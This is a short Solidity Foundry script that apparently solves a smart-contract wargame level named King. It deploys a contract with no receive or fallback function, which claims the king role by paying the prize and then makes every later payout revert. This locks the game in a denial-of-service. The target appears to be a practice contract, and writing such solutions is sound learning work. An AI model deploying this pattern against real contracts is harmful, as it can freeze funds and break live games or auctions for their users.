// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import{Script,console} from "forge-std/Script.sol";
import{King} from "../src/Level9.sol";

/**Once our new king contract becomes the owner there are no fallback or recieve function implememted to recieve the ether it reverts all the time after we become the new king */
contract NewKing{
        King level9=King(payable(0x3149d46967f260c97358D916004dC6D29C424AfD));
        constructor() payable{
            address(level9).call{value:level9.prize()}("");  //calling recieve function in King contract
        }
}
contract Level9Solution is Script{
    King level9=King(payable(0x3149d46967f260c97358D916004dC6D29C424AfD));
    function run() external{
        uint256 prize=level9.prize();
        console.log("You have to send atleast",prize,"wei to become the king");
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new NewKing();  //it triggers recieve function in king contract
        vm.stopBroadcast();
    }
}